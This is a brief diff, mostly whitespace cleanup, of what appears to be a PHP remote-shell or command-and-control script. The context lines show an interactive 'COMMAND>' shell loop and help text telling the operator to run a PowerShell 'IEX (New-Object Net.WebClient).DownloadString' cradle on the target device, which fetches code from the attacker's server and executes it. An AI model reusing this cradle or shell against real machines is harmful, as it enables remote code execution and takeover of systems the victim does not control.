@@ -57,7 +57,6 @@ if(isset($_SERVER["REQUEST_METHOD"]) && $_SERVER['REQUEST_METHOD'] === 'GET')
 
 
 //------- shell --------------//
-
 while (!feof(STDIN))
 {
 	echo 'COMMAND> ';
@@ -116,12 +115,10 @@ echo '}';
 function mkOwnUrl()
 {
 	return 'http://' . $_SERVER['HTTP_HOST'] . 	$_SERVER['PHP_SELF'];
-	
 }
 
 function showHelp()
 {
-
 	echo <<<EOF
 Type the following command on the target device.
 powershell IEX (New-Object Net.WebClient).DownloadString('http://IP Address/this file path')
